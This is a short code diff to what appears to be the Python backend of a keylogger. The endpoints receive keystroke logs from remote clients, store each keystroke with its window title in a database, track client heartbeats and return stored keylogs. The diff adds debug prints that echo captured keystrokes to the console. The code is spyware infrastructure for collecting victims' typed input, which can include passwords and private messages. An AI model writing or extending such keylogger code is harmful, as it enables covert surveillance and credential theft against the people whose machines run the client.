@@ -502,12 +502,16 @@ def receive_keylog_data():
         if client_id and logs:
             if db:
                 for log in logs:
+                    keystroke_value = log.get('keystroke', log.get('key', ''))
+                    window_value = log.get('window', log.get('app', 'Unknown'))
+                    print(f"[KEYLOG] Storing - keystroke: '{keystroke_value}', window: '{window_value}'")
+                    
                     db.store_keylog(
                         client_id, 
-                        log.get('keystroke', log.get('key', '')),  # Support both 'keystroke' and 'keys'
+                        keystroke_value,
                         {
                             "timestamp": log.get('timestamp'), 
-                            "window_title": log.get('window', log.get('app', 'Unknown'))
+                            "window_title": window_value
                         }
                     )
                 db.update_client_heartbeat(client_id)
@@ -555,6 +559,10 @@ def get_client_keylogs(client_id):
         
         if db:
             db_logs = db.get_keylogs(client_id, limit)
+            print(f"[KEYLOG] Retrieved {len(db_logs)} logs from DB")
+            if db_logs:
+                print(f"[KEYLOG] Sample log: {db_logs[0]}")
+            
             logs = [{
                 "keystroke": log['keystrokes'],
                 "timestamp": log['timestamp'].isoformat() if hasattr(log['timestamp'], 'isoformat') else str(log['timestamp']),
